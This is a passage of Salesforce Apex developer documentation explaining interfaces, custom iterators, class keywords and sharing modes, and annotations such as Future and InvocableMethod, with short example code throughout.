OuterClass.InnerClass ic = new OuterClass.InnerClass('x');
```

```apex
// Call user-defined methods in the class
System.assertEquals(2, ic.method2(1));
```

```apex
// Define a variable with an interface data type, and assign it a value that is of
// a type that implements that interface
OuterClass.MyInterface mi = ic;
```

```apex
// Use instanceof and casting as usual
OuterClass.InnerClass ic2 = mi instanceof OuterClass.InnerClass ?
(OuterClass.InnerClass)mi : null;
System.assert(ic2 != null);
```

```apex
// Construct the outer type
OuterClass o = new OuterClass();
System.assertEquals(2, OuterClass.getInt());
```

```apex
// Construct instances of abstract class children
System.assertEquals(5, new OuterClass.ConcreteChildClass().abstractMethod());
```

```apex
// Illegal - cannot construct an abstract class
// new OuterClass.AbstractChildClass();
```

```apex
// Illegal – cannot access a static method through an instance
// o.getInt();
```

```apex
// Illegal - cannot call protected method externally
// new OuterClass.ConcreteChildClass().method2();
```

This code example illustrates: Construction of the outer class Construction of an inner class and the declaration of an inner interface type A variable declared as an interface type can be assigned an instance of a class that implements that interface Casting an interface variable to be a class type that implements that interface (after verifying this using the `instanceof` operator)

### Interfaces

An interface is like a class in which none of the methods have been implemented—the method signatures are there, but the body of each method is empty. To use an interface, another class must implement it by providing a body for all of the methods contained in the interface. Interfaces can provide a layer of abstraction to your code. They separate the specific implementation of a method from the declaration for that method. This way you can have different implementations of a method based on your specific application. Defining an interface is similar to defining a new class. For example, a company can have two types of purchase orders, ones that come from customers, and others that come from their employees. Both are a type of purchase order. Suppose you needed a method to provide a discount. The amount of the discount can depend on the type of purchase order. You can model the general concept of a purchase order as an interface and have specific implementations for customers and employees. In the following example the focus is only on the discount aspect of a purchase order. Here’s the definition of the `PurchaseOrder` interface.

```apex
// An interface that defines what a purchase order looks like in general
public interface PurchaseOrder {
```

```apex
// All other functionality excluded
Double discount();
}
```

This class implements the `PurchaseOrder` interface for customer purchase orders.

```apex
// One implementation of the interface for customers
public class CustomerPurchaseOrder implements PurchaseOrder {
```

```apex
public Double discount() {
```

```apex
return .05;
// Flat 5% discount
}
}
```

This class implements the `PurchaseOrder` interface for employee purchase orders.

```apex
// Another implementation of the interface for employees
public class EmployeePurchaseOrder implements PurchaseOrder {
```

```apex
public Double discount() {
```

```apex
return .10;
// It’s worth it being an employee! 10% discount
}
}
```

Note the following about the example: The interface `PurchaseOrder` is defined as a general prototype. Methods defined within an interface have no access modifiers and contain just their signature. The `CustomerPurchaseOrder` class implements this interface; therefore, it must provide a definition for the `discount` method. Any class that implements an interface must define all the methods contained in the interface. When you define a new interface, you’re defining a new data type. You can use an interface name in any place you can use another data type name. Any object assigned to a variable of type interface must be an instance of a class that implements the interface, or a sub-interface data type. See also Classes and Casting on page 118. You can’t add a method to a global interface after the class has been uploaded in a Managed - Released package version.

#### Versioned Behavior Changes

In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are annotated with `@namespaceAccessible` . For accessibility considerations, see NamespaceAccessible Annotation . For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages . In API version 61.0 and later, private methods are no longer overridden by an instance method with the same signature in a subclass. This change is versioned, so to prevent the override, update your abstract or virtual classes that contain private methods to API version 61.0 or later. In API version 60.0 and earlier, if a subclass declares an instance method with the same signature as a private method in one of its superclasses, the subclass method overrides the private method. 1. Custom Iterators

#### Custom Iterators

An iterator traverses through every item in a collection. For example, in a procedural loop, you define a condition for exiting the loop, and you must provide some means of traversing the collection, that is, an iterator. In this example, `count` is incremented by 1 every time the loop is executed.

```apex
while (count < 11) {
System.debug(count);
count++;
}
```

Using the `Iterator` interface you can create a custom set of instructions for traversing a List through a loop. The iterator is useful for data that exists in sources outside of Salesforce that you would normally define the scope of using a `SELECT` statement. Iterators can also be used if you have multiple `SELECT` statements. To use custom iterators, you must create an Apex class that implements the `Iterator` interface. The `Iterator` interface has the following instance methods: Returns `true` if there’s another item in the collection being traversed, `false` otherwise. Boolean `hasNext` Returns the next item in the collection. Any type `next` All methods in the `Iterator` interface must be declared as `global` or `public` . This example code uses a custom iterator to iterate through a list of strings.

```apex
IterableString x = new IterableString('This is a really cool test.');
```

```apex
while(x.hasNext()){
system.debug(x.next());
}
```

`Iterable` If you don’t want to use a custom iterator with a list, but instead want to create your own data structure, you can use the `Iterable` interface to generate the data structure. The `Iterable` interface has the following method: Returns a reference to the iterator for this interface. Iterator class `iterator` The `iterator` method must be declared as `global` or `public` . It creates a reference to the iterator that you can then use to traverse the data structure. In the following example a custom iterator iterates through a collection:

```apex
public class CustomIterator
```

```apex
implements Iterator<Account>{
```

```apex
private List<Account> accounts;
private Integer currentIndex;
```

```apex
public CustomIterator(List<Account> accounts){
```

```apex
this.accounts = accounts;
this.currentIndex = 0;
}
```

```apex
public Boolean hasNext(){
```

```apex
return currentIndex < accounts.size();
}
```

```apex
public Account next(){
```

```apex
if(hasNext()) {
```

```apex
return accounts[currentIndex++];
} else {
```

```apex
throw new NoSuchElementException('Iterator has no more elements.');
}
}
}
```

```apex
public class CustomIterable implements Iterable<Account> {
```

```apex
public Iterator<Account> iterator(){
List<Account> accounts =
[SELECT Id, Name,
NumberOfEmployees
FROM Account
LIMIT 10];
return new CustomIterator(accounts);
}
}
```

The following is a batch job that uses an iterator:

```apex
public class BatchClass implements Database.Batchable<Account>{
```

```apex
public Iterable<Account> start(Database.BatchableContext info){
```

```apex
return new CustomIterable();
}
public void execute(Database.BatchableContext info, List<Account> scope){
List<Account> accsToUpdate = new List<Account>();
for(Account acc : scope){
acc.Name = 'changed';
acc.NumberOfEmployees = 69;
accsToUpdate.add(acc);
}
update accsToUpdate;
}
public void finish(Database.BatchableContext info){
}
}
```

### Keywords

Apex provides the keywords `final` , `instanceof` , `super` , `this` , `transient` , `with` `sharing` and `without` `sharing` . 1. Using the final Keyword 2. Using the instanceof Keyword 3. Using the super Keyword 4. Using the this Keyword 5. Using the transient Keyword 6. Use the with sharing, without sharing, and inherited sharing Keywords Use the `with` `sharing` or `without` `sharing` keywords on a class to specify whether sharing rules are enforced. Use the `inherited` `sharing` keyword on a class to run the class in the sharing mode of the calling class. The default sharing mode is `with` `sharing` . Reserved Keywords

#### Using the final Keyword

Keep in mind these consideration while using the `final` keyword to modify variables. Final variables can be assigned a value only once. Static final variables can be initialized in static initialization code blocks or where defined. Member final variables can be initialized in initialization code blocks, constructors, or where defined. To define a constant, mark a variable as both `static` and `final` . Non-final static variables are used to communicate state at the class level (such as state between triggers). However, they aren’t shared across requests. Methods and classes are final by default. You can’t use the `final` keyword in the declaration of a class or method. This means they can’t be overridden. Use the `virtual` keyword if you need to override a method or class. You can’t use the `final` keyword with properties. Extended Class Example

#### Using the instanceof Keyword

If you need to verify at run time whether an object is actually an instance of a particular class, use the `instanceof` keyword. The `instanceof` keyword can only be used to verify if the target type in the expression on the right of the keyword is a viable alternative for the declared type of the expression on the left. You could add the following check to the `Report` class in the classes and casting example before you cast the item back into a `CustomReport` object.

```apex
if (Reports.get(0) instanceof CustomReport) {
```

```apex
// Can safely cast it back to a custom report object
CustomReport c = (CustomReport) Reports.get(0);
} else {
// Do something with the non-custom-report.
}
```

Keep these considerations in mind while using the `instanceof` keyword. If the declared type on the left of the expression using the `instanceof` keyword is always an instance of the target type, compilation fails. An example expression that’s always true and therefore causes a compilation error.

```apex
Account acc = new Account();
if(acc instanceOf Account) {
//condition is always true since an instance of Account is always an instance of
```

```apex
Account
}
```

When you perform `instanceof` checks, implicit type casting from String to ID can result in unexpected behavior if the String meets the requirements to be cast to an ID. In API version 60.0 and later, if a `List` data type implements the `Iterable` data type, compilation fails. An example `instanceof` expression that causes a compilation error.

```apex
public class BaseClass {}
public class SubClass extends BaseClass {}
```

```apex
List<SubClass> subClasses = new List<SubClass>();
if(subClasses instanceof Iterable<BaseClass>) {
//condition is always true since an instance of SubClass is always an instance of
BaseClass
}
```

In API version 32.0 and later, `instanceof` returns `false` if the left operand is a null object. In API version 31.0 and earlier, `instanceof` returns true in this case. For example, the code sample returns `false` in API version 32.0 and later.

```apex
Object o = null;
Boolean result = o instanceof Account;
System.assertEquals(false, result);
```

#### Using the super Keyword

The `super` keyword can be used by classes that are extended from virtual or abstract classes. By using `super` , you can override constructors and methods from the parent class. For example, if you have the following virtual class:

```apex
public virtual class SuperClass {
```

```apex
public String mySalutation;
public String myFirstName;
public String myLastName;
```

```apex
public SuperClass() {
```

```apex
mySalutation = 'Mr.';
myFirstName = 'Carl';
myLastName = 'Vonderburg';
}
```

```apex
public SuperClass(String salutation, String firstName, String lastName) {
```

```apex
mySalutation = salutation;
myFirstName = firstName;
myLastName = lastName;
}
```

```apex
public virtual void printName() {
```

```apex
System.debug('My name is ' + mySalutation + myLastName);
}
```

```apex
public virtual String getFirstName() {
```

```apex
return myFirstName;
}
}
```

You can create the following class that extends `Superclass` and overrides its `printName` method:

```apex
public class Subclass extends Superclass {
```

```apex
public override void printName() {
```

```apex
super.printName();
System.debug('But you can call me ' + super.getFirstName());
}
}
```

The expected output when calling `Subclass.printName` is `My` `name` `is` `Mr.` `Vonderburg.` `But` `you` `can` `call` `me` `Carl.` You can also use `super` to call constructors. Add the following constructor to `SubClass` :

```apex
public Subclass() {
```

```apex
super('Madam', 'Brenda', 'Clapentrap');
}
```

Now, the expected output of `Subclass.printName` is `My` `name` `is` `Madam` `Clapentrap.` `But` `you` `can` `call` `me` `Brenda.` `super` Only classes that are extending from `virtual` or `abstract` classes can use `super` . You can only use `super` in methods that are designated with the `override` keyword.

#### Using the this Keyword

There are two different ways of using the `this` keyword. You can use the `this` keyword in dot notation, without parenthesis, to represent the current instance of the class in which it appears. Use this form of the `this` keyword to access instance variables and methods. For example:

```apex
public class myTestThis {
```

```apex
string s;
{
```

```apex
this.s = 'TestString';
}
}
```

In the above example, the class `myTestThis` declares an instance variable `s` . The initialization code populates the variable using the `this` keyword. Or you can use the `this` keyword to do constructor chaining, that is, in one constructor, call another constructor. In this format, use the `this` keyword with parentheses. For example:

```apex
public class testThis {
```

```apex
// First constructor for the class. It requires a string parameter.
```

```apex
public testThis(string s2) {
}
```

```apex
// Second constructor for the class. It does not require a parameter.
// This constructor calls the first constructor using the this keyword.
```

```apex
public testThis() {
```

```apex
this('None');
}
}
```

When you use the `this` keyword in a constructor to do constructor chaining, it must be the first statement in the constructor.

#### Using the transient Keyword

Use the `transient` keyword to declare instance variables that can't be saved, and shouldn't be transmitted as part of the view state for a Visualforce page. For example:

```apex
Transient Integer currentTotal;
```

You can also use the `transient` keyword in Apex classes that are serializable, namely in controllers, controller extensions, or classes that implement the `Batchable` or `Schedulable` interface. In addition, you can use `transient` in classes that define the types of fields declared in the serializable classes. Declaring variables as `transient` reduces view state size. A common use case for the `transient` keyword is a field on a Visualforce page that is needed only for the duration of a page request, but should not be part of the page's view state and would use too many system resources to be recomputed many times during a request. Some Apex objects are automatically considered transient, that is, their value does not get saved as part of the page's view state. These objects include the following: PageReferences XmlStream classes Collections automatically marked as transient only if the type of object that they hold is automatically marked as transient, such as a collection of Savepoints Most of the objects generated by system methods, such as `Schema.getGlobalDescribe` . `JSONParser` class instances. Static variables also don't get transmitted through the view state. The following example contains both a Visualforce page and a custom controller. Clicking the **refresh** button on the page causes the transient date to be updated because it is being recreated each time the page is refreshed. The non-transient date continues to have its original value, which has been deserialized from the view state, so it remains the same.

```apex
<apex:page controller="ExampleController">
T1: {!t1} <br/>
T2: {!t2} <br/>
<apex:form>
```

```apex
<apex:commandLink value="refresh"/>
```

```apex
</apex:form>
</apex:page>
```

```apex
public class ExampleController {
```

```apex
DateTime t1;
transient DateTime t2;
```

```apex
public String getT1() {
```

```apex
if (t1 == null) t1 = System.now();
return '' + t1;
}
```

```apex
public String getT2() {
```

```apex
if (t2 == null) t2 = System.now();
return '' + t2;
}
}
```

Apex Reference Guide : JSONParser Class

#### Use the with sharing , without sharing , and inherited sharing Keywords

Use the `with` `sharing` or `without` `sharing` keywords on a class to specify whether sharing rules are enforced. Use the `inherited` `sharing` keyword on a class to run the class in the sharing mode of the calling class. The default sharing mode is `with` `sharing` . For information about how to create sharing rules, see Sharing Rules in Salesforce Help. Use the `with` `sharing` keyword when declaring a class to enforce sharing rules of the current user. Salesforce recommends that you explicitly set this keyword to ensure that Apex code runs in the current user context. If a class doesn’t have an explicit sharing declaration, then it defaults to `with` `sharing` .

```apex
public with sharing class sharingClass {
```

```apex
// Code here
```

```apex
}
```

Use the `without` `sharing` keyword when declaring a class to ensure that the sharing rules for the current user aren’t enforced. For example, you can explicitly allow a class to ignore sharing rules even when it’s called from another class that does enforce sharing rules.

```apex
public without sharing class noSharing {
```

```apex
// Code here
```

```apex
}
```

If you declare a class as `without` `sharing` , the class can access records that the current user otherwise doesn’t have permission to access. Salesforce recommends that you use `without` `sharing` only for classes that require system-level access. Use the `inherited` `sharing` keyword when declaring a class to enforce the sharing rules of the calling class. Using `inherited` `sharing` is an advanced technique to determine the sharing mode at run time and design Apex classes that can run in either `with` `sharing` or `without` `sharing` mode. Because the sharing mode is determined at run time, you must take extreme care to ensure that your Apex code is secure to run in both `with` `sharing` and `without` `sharing` modes. Using `inherited` `sharing` , along with other appropriate security checks, helps your code pass AppExchange security review and ensures that your privileged Apex code isn’t used in unexpected or insecure ways. An Apex class with `inherited` `sharing` runs in `with` `sharing` mode if used as: An Aura component controller An `@AuraEnabled` method called from a Lightning web component A Visualforce controller An Apex REST service An asynchronous Apex class Any other entry point to an Apex transaction A class declared as `inherited` `sharing` runs as `without` `sharing` only when explicitly called from an already established `without` `sharing` context. Apex without an explicit sharing declaration runs as `with` `sharing` by default. However, if an Apex class without an explicit sharing declaration extends from a parent class, it adopts the same sharing mode as the parent class. We recommend that you always include an explicit sharing declaration on Apex classes that include database operations or SOQL queries. This practice promotes intentionality and increases code maintainability. Identifying the sharing mode for Apex classes compiled with API version 66.0 or earlier is challenging without an explicit declaration. Determining the sharing mode in these cases requires a thorough investigation of the class inheritance tree, the caller sequence, and the class’s behavior. See the Versioned Behavior Changes section. Apex triggers can’t have an explicit sharing declaration. Triggers always run in system mode and as `without` `sharing` , which means that they bypass the sharing rules, field-level security, and object permissions of the current user. Instead, to enforce data access settings, delegate business logic to separate trigger handlers, where you can define sharing and access modes. Sharing declarations don’t enforce object-level access or field-level security. See Enforcing Object and Field Permissions . Except for methods in an `inherited` `sharing` class, the sharing mode of a method is determined by where the method is defined, not where it’s called from. For example, a method defined in a `with` `sharing` class still enforces sharing rules even if it’s called from a `without` `sharing` class. Exceptions also apply to methods for classes compiled with API version 66.0 or earlier. See the Versioned Behavior Changes section. You can declare a sharing mode on both inner classes and outer classes. Inner classes don’t adopt the sharing mode of the container class. Otherwise, the sharing setting applies to all code contained in the class, including initialization code, constructors, and methods. If an Apex class without an explicit sharing declaration extends from a parent class, then it adopts the same sharing mode as the parent class. Asynchronous Apex classes defined with `inherited` `sharing` always run in `with` `sharing` mode for asynchronous operations. Each asynchronous operation is a new entry point and the sharing mode isn’t serialized. Anonymous Apex and Connect in Apex always run in `with` `sharing` mode. We recommend that you always include an explicit sharing declaration on Apex classes that include database operations or SOQL queries. This practice promotes intentionality and increases code maintainability. Use this mode as the default unless your use case requires otherwise. `with` `sharing` Use this mode with caution. Make sure that you don’t inadvertently expose sensitive data that’s normally hidden by sharing rules. This

```apex
without sharing
```

sharing mode is best used to grant targeted elevation of sharing privileges to the current user. For example, use `without` `sharing` to allow community users to read records to which they wouldn’t otherwise have access. Use this mode for service classes that must be flexible and support use cases with different sharing modes. `inherited` `sharing` In API version 67.0 and later, classes without an explicit sharing declaration run in `with` `sharing` mode. In API version 66.0 and earlier, the sharing mode of classes without an explicit sharing declaration is determined according these factors. If the class is part of an inheritance chain, and any class in that chain is saved as API version 67.0 and later, the class runs in `with` `sharing` mode. If the class is an Aura controller or an `@AuraEnabled` method called from a Lightning web component, the class runs in `with` `sharing` mode. Otherwise, the class runs in `without` `sharing` mode. If the class isn’t an Apex entry point, its sharing mode is defined by the sharing mode of the calling class.

### Annotations

An Apex annotation modifies the way that a method or class is used, similar to annotations in Java. Annotations are defined with an initial `@` symbol, followed by the appropriate keyword. To add an annotation to a method, specify it immediately before the method or class definition. For example:

```apex
global class MyClass {
```

```apex
@Future
Public static void myMethod(String a)
{
```

```apex
//long-running Apex code
}
}
```

Apex supports these annotations.

```apex
•
@AuraEnabled
```

```apex
•
@Deprecated
```

`@Future`

```apex
•
@InvocableMethod
```

```apex
•
@InvocableVariable
```

`@IsTest`

```apex
•
@JsonAccess
```

```apex
•
@NamespaceAccessible
```

```apex
•
@ReadOnly
```

```apex
•
@RemoteAction
```

```apex
•
@SuppressWarnings
```

```apex
•
@TestSetup
```

```apex
•
@TestVisible
```

Apex REST annotations:

```apex
–
@ReadOnly
```

```apex
–
@RestResource(urlMapping='/yourUrl')
```

```apex
–
@HttpDelete
```

`@HttpGet`

```apex
–
@HttpPatch
```

```apex
–
@HttpPost
```

`@HttpPut` You can use multiple annotations for the same class or method. Specify each annotation on a separate line immediately before the class or method definition. Some annotations can’t be used together. If applicable, these limitations are documented on the page for the annotation. 1. AuraEnabled Annotation 2. Deprecated Annotation 3. Future Annotation Use the `Future` annotation to identify methods that run asynchronously. A future method runs when Salesforce has available resources. 4. IntegrationTest Annotation (Developer Preview) Use the `IntegrationTest` annotation to mark both classes and methods that are used in integration testing. 5. InvocableMethod Annotation Use the `InvocableMethod` annotation to identify methods that can be run as invocable actions. 6. InvocableVariable Annotation To identify variables used by invocable methods in custom classes, use the `InvocableVariable` annotation. 7. IsTest Annotation 8. JsonAccess Annotation The `@JsonAccess` annotation defined at Apex class level controls whether instances of the class can be serialized or deserialized. If the annotation restricts the JSON or XML serialization and deserialization, a runtime `JSONException` exception is thrown. 9. NamespaceAccessible Annotation 10. ReadOnly Annotation 11. RemoteAction Annotation 12. SuppressWarnings Annotation This annotation does nothing in Apex but can be used to provide information to third-party tools. 13. TestSetup Annotation Methods defined with the `@TestSetup` annotation are used for creating common test records that are available for all test methods in the class. 14. TearDown Annotation (Developer Preview) Use the `TearDown` annotation to mark a cleanup method that runs after the test completes, regardless of pass or fail. 15. TestVisible Annotation

#### AuraEnabled Annotation

The `@AuraEnabled` annotation enables client-side and server-side access to an Apex controller method. Providing this annotation makes your methods available to your Lightning components (both Lightning web components and Aura components). Only methods with this annotation are exposed. In API version 44.0 and later, you can improve runtime performance by caching method results on the client by using the annotation `@AuraEnabled(cacheable=` `true` `)` . You can cache method results only for methods that retrieve data but don’t modify it. Using this annotation eliminates the need to call `setStorable()` in JavaScript code on every action that calls the Apex method. In API version 55.0 and later, you can use the annotation `@AuraEnabled(cacheable=` `true` `scope=` `'global'` `)` to enable Apex methods to be cached in a global cache. For more information, see Lightning Aura Components Developer Guide and Lightning Web Components Developer Guide . In API version 55.0 and later, overloads aren’t allowed on methods annotated with `@AuraEnabled` .

#### Deprecated Annotation

Use the `Deprecated` annotation to identify methods, classes, exceptions, enums, interfaces, or variables that can no longer be referenced in subsequent releases of the managed package in which they reside. This annotation is useful when you’re refactoring code in managed packages as the requirements evolve. New subscribers can’t see the deprecated elements, while the elements continue to function for existing subscribers and API integrations. The following code snippet shows a deprecated method. The same syntax can be used to deprecate classes, exceptions, enums, interfaces, or variables.

```apex
@Deprecated
// This method is deprecated. Use myOptimizedMethod(String a, String b) instead.
global void myMethod(String a) {
```

```apex
}
```

Note the following rules when deprecating Apex identifiers: Unmanaged packages can’t contain code that uses the `deprecated` keyword. When an Apex item is deprecated, all `global` access modifiers that reference the deprecated identifier must also be deprecated. Any global method that uses the deprecated type in its signature, either in an input argument or the method return type, must also be deprecated. A deprecated item, such as a method or a class, can still be referenced internally by the package developer. `webservice` methods and variables can’t be deprecated. You can deprecate an `enum` but you can’t deprecate individual `enum` values. You can deprecate an interface but you can’t deprecate individual methods in an interface. You can deprecate an abstract class but you can’t deprecate individual abstract methods in an abstract class. You can’t remove the `Deprecated` annotation to undeprecate something in Apex after you’ve released a package version where that item in Apex is deprecated. For more information about package versions, see Managed Package Types on page 765.

#### Future Annotation

Use the `Future` annotation to identify methods that run asynchronously. A future method runs when Salesforce has available resources. Salesforce now recommends that you use Queueable Apex instead of Apex future methods. Queueables have the same use cases as future methods but offer extra benefits, including job IDs, support for non-primitive types, and job chaining. See Queueable Apex . For example, you can use the `Future` annotation when making an asynchronous web service callout to an external service. Without the annotation, the web service callout is made from the same thread that is running the Apex code. Then no additional processing can occur until the callout is complete (synchronous processing). Methods with the `Future` annotation must be static methods, and can only return a void type. The specified parameters must be primitive data types, arrays of primitive data types, or collections of primitive data types. Methods with the `Future` annotation can’t take sObjects or objects as arguments. To make a method in a class execute asynchronously, define the method with the `Future` annotation. For example:

```apex
public with sharing class MyFutureClass {
```

```apex
@Future
static void myMethod(String a, Integer i) {
System.debug('Method called with: ' + a + ' and ' + i);
// Perform long-running code
}
}
```

To allow callouts in a `Future` method, specify `(` `callout` `=` `true` `)` . The default is `(` `callout` `=` `false` `)` , which prevents a method from making callouts. The following snippet shows how to specify that a method executes a callout:

```apex
@Future (callout=true)
public static void doCalloutFromFuture() {
```

```apex
//Add code to perform callout
}
```

Remember that any method that uses the `Future` annotation requires special consideration because the method doesn’t necessarily execute in the same order that it’s called in. Methods with the `Future` annotation can’t be used in Visualforce controllers in either `get` `MethodName` or `set` `MethodName` methods, nor in the constructor. You can’t call a method annotated with `Future` from a method that also has the `Future` annotation. Nor can you call a trigger from an annotated method that calls another annotated method.

#### IntegrationTest Annotation (Developer Preview)

Use the `IntegrationTest` annotation to mark both classes and methods that are used in integration testing. The Apex Integration Tests feature is available as a developer preview in scratch orgs in Summer ’26 (API version 67.0). The feature isn’t generally available unless or until Salesforce announces its general availability in documentation or in press releases or public statements. All commands, parameters, and other features are subject to change or deprecation at any time, with or without notice. Don't implement functionality developed with these commands or tools in your production package. A class annotated with @IntegrationTest can only contain integration test methods and @TearDown methods. You can't mix @IntegrationTest and @IsTest annotations on the same class. Integration test methods cannot be called from non-test contexts or from @IsTest test methods. However, integration tests can call methods in @IsTest utility classes, for example, shared test data factories.

#### InvocableMethod Annotation

Use the `InvocableMethod` annotation to identify methods that can be run as invocable actions. If a flow invokes Apex, the running user must have the corresponding Apex class security set in their user profile or permission set. Invocable methods are called natively from REST, Apex, flows, Agentforce agents or AI bots that interact with the external API source. Invocable methods have dynamic input and output values and support `describe` calls. This code sample shows an invocable method with primitive data types.

```apex
public with sharing class AccountQueryAction {
@InvocableMethod(
label='Get Account Names'
description='Returns the list of account names corresponding to the specified account
IDs.'
```

```apex
category='Account'
)
public static List<String> getAccountNames(List<ID> ids) {
List<Account> accounts = [
SELECT Name
FROM Account
```

```apex
WHERE Id IN :ids
WITH USER_MODE
];
Map<ID, String> idToName = new Map<ID, String>();
for (Account account : accounts) {
idToName.put(account.Id, account.Name);
}
// put each name in the output at the same position as the id in the input
List<String> accountNames = new List<String>();
for (String id : ids) {
accountNames.add(idToName.get(id));
}
return accountNames;
}
}
```

This code sample shows an invocable method with a specific sObject data type.

```apex
public with sharing class AccountInsertAction {
@InvocableMethod(
label='Insert Accounts'
description='Inserts the accounts specified and returns the IDs of the new accounts
or null if account is failed to create.'
```

```apex
category='Account'
)
public static List<ID> insertAccounts(List<Account> accounts) {
Database.SaveResult[] results = Database.insert(
accounts,
false,
AccessLevel.USER_MODE
);
List<ID> accountIds = new List<ID>();
```

```apex
for (Database.SaveResult result : results) {
```

```apex
if (result.isSuccess()) {
accountIds.add(result.getId());
} else {
accountIds.add(null);
}
}
```

```apex
return accountIds;
}
}
```

This code sample shows an invocable method with the generic sObject data type.

```apex
public with sharing class GetFirstFromCollection {
@InvocableMethod
public static List<Results> execute(List<Requests> requestList) {
List<Results> results = new List<Results>();
for (Requests request : requestList) {
List<SObject> inputCollection = request.inputCollection;
SObject outputMember = inputCollection[0];
```

```apex
//Create a Results object to hold the return values
Results result = new Results();
```

```apex
//Add the return values to the Results object
result.outputMember = outputMember;
```

```apex
//Add Result to the results List at the same position as the request is in the
requests List
```

```apex
results.add(result);
}
return results;
}
```

```apex
public with sharing class Requests {
@InvocableVariable(
label='Records for Input'
description='yourDescription'
required=true
)
public List<SObject> inputCollection;
}
```

```apex
public with sharing class Results {
@InvocableVariable(
label='Records for Output'
description='yourDescription'
required=true
)
public SObject outputMember;
}
}
```

This code sample shows an invocable method with a custom icon from an SVG file.

```apex
global with sharing class CustomSvgIcon {
@InvocableMethod(label='myIcon' iconName='resource:myPackageNamespace__google:top')
global static List<Integer> myMethod(List<Integer> request) {
List<Integer> results = new List<Integer>();
for(Integer reqInt : request) {
results.add(reqInt);
}
return results;
}
}
```

This code sample shows an invocable method with a custom icon from the Salesforce Lightning Design System (SLDS).

```apex
public with sharing class CustomSldsIcon {
```

```apex
@InvocableMethod(iconName='slds:standard:choice')
public static void run() {}
```

```apex
}
```

To handle exceptions within an invocable method, wrap the results in an Apex object that reports failures. The execution of the invocable method must run and return the same number of results as inputs received even if errors occur. For example, this code sample adjusts positive values by taking their square root and multiplying by pi, setting a success flag to `true` . For negative values, it sets the success flag to `false` .

```apex
global with sharing class AdjustPositiveValuesAction {
@InvocableMethod(
label='Adjust Positive Values'
description='Returns the list of adjusted values. If a number is negative, a failure
is reported for that value.'
```

```apex
)
public static List<AdjustmentResult> doAdjustment(List<Double> values) {
List<AdjustmentResult> results = new List<AdjustmentResult>();
```

```apex
for (Double value : values) {
AdjustmentResult result = new AdjustmentResult();
```

```apex
try {
```

```apex
// Adjust the value, scale by pi.
// Note: If the value is negative, this operation throws an exception.
result.adjustedValue = Math.sqrt(value) * Math.PI;
result.adjustmentSucceeded = true;
} catch (Exception e) {
```

```apex
// If a negative value caused an exception, mark the adjustment as failed, and
keep processing other values.
```

```apex
result.adjustmentSucceeded = false;
}
```

```apex
results.add(result);
}
```

```apex
return results;
}
```

```apex
global with sharing class AdjustmentResult {
@InvocableVariable(label='True if adjustment succeeded')
global boolean adjustmentSucceeded;
```

```apex
@InvocableVariable(
label='Adjusted value, only valid if adjustment succeeded'
)
global Double adjustedValue;
}
}
```

This test method checks whether the value adjustments were successful and verifies the calculated values for positive inputs.

```apex
// Test class for AdjustPositiveValuesAction
@IsTest
private with sharing class AdjustPositiveValuesActionTest {
```

```apex
@IsTest
private static void doTest() {
```

```apex
// Create a list of test values: 4, -1, 1
List<Double> values = new List<Double>();
values.add(4);
values.add(-1);
values.add(1);
```

```apex
Test.startTest();
```

```apex
// Call the doAdjustment method with the test values.
List<AdjustPositiveValuesAction.AdjustmentResult> results =
AdjustPositiveValuesAction.doAdjustment(values);
```

```apex
Test.stopTest();
```

```apex
// Assertions to check if adjustments were successful or not for each input value.
Assert.isTrue(results[0].adjustmentSucceeded);
Assert.isFalse(results[1].adjustmentSucceeded);
Assert.isTrue(results[2].adjustmentSucceeded);
```

```apex
// Assertions to check the calculated adjusted values for positive inputs.
Assert.areEqual(2 * Math.PI, results[0].adjustedValue);
Assert.areEqual(Math.PI, results[2].adjustedValue);
}
}
```

All modifiers are optional. **label** The label for the method, which appears as the action name in Flow Builder. The default is the method name, though we recommend that you provide a label. **description** The description for the method, which appears as the action description in Flow Builder. The default is `Null` . **callout** The callout modifier identifies whether the method calls to an external system. If the method calls to an external system, add `callout` `=` `true` . The default value is `false` . **capabilityType** The capability that integrates with the method. The valid format is `Name://Name` , for example: `PromptTemplateType://SalesEmail` **category** The category for the method, which appears as the action category in Flow Builder. If no category is provided (by default), actions appear under Uncategorized. **configurationEditor** The custom property editor that is registered with the method and appears in Flow Builder when an admin configures the action. If you don’t specify this modifier, Flow Builder uses the standard property editor. **iconName** The name of the icon to use as a custom icon for the action in the Flow Builder canvas. You can specify an SVG file that you uploaded as a static resource or a Salesforce Lightning Design System standard icon. **Implementation Notes** The invocable method must be `static` and `public` or `global` , and its class must be an outer class. Only one method in a class can have the `InvocableMethod` annotation. The only annotation that can be used with the `InvocableMethod` annotation is `Deprecated` . **Inputs and Outputs** There can be at most one input parameter and its data type must be one of the following: A list of a primitive data type or a list of lists of a primitive data type – the generic `Object` type isn’t supported. A list of an sObject type or a list of lists of an sObject type. A list of the generic sObject type ( `List<sObject>` ) or a list of lists of the generic sObject type ( `List<List<sObject>>` ). A list of a user-defined type, containing variables of the supported types or user-defined Apex types, with the `InvocableVariable` annotation. To implement your data type, create a custom global or public Apex class. The class must contain at least one member variable with the invocable variable annotation. If the return type isn’t `Null` , the data type returned by the method must be one of the following: A list of a primitive data type or a list of lists of a primitive data type – the generic `Object` type isn’t supported. A list of an sObject type or a list of lists of an sObject type. A list of the generic sObject type ( `List<sObject>` ) or a list of lists of the generic sObject type ( `List<List<sObject>>` ). A list of a user-defined type, containing variables of the supported types or user-defined Apex types, with the `InvocableVariable` annotation. To implement your data type, create a custom global or public Apex class. The class must contain at least one member variable with the invocable variable annotation. For a correct bulkification implementation, the Inputs and Outputs must match on both the size and the order. For example, the i-th Output entry must correspond to the i-th Input entry. Matching entries are required for data correctness when your action is in bulkified execution, such as when an apex action is used in a record trigger flow. **Managed Packages** You can use invocable methods in packages, but after you add an invocable method you can’t remove it from later versions of the package. Public invocable methods can be referred to by flows and processes within the managed package. Global invocable methods can be referred to anywhere in the subscriber org. Only global invocable methods appear in Flow Builder and Process Builder in the subscriber org. See Best Practices for Using Global Apex in Managed Packages on page 772. For more information about invocable actions, see Apex Actions in the Actions Developer Guide . InvocableVariable Annotation Actions Developer Guide : Apex Actions REST API Developer Guide : Invocable Actions Salesforce Help : Add a Custom Icon to an Apex-Defined Action Apex Reference Guide : Action Class Lightning Web Components Developer Guide : Develop Custom Property Editors for Flow Builder Prompt Builder : Ground with Apex Making Callouts to External Systems from Invocable Actions Extend Invocable Action Configuration in Flow Builder

#### InvocableVariable Annotation

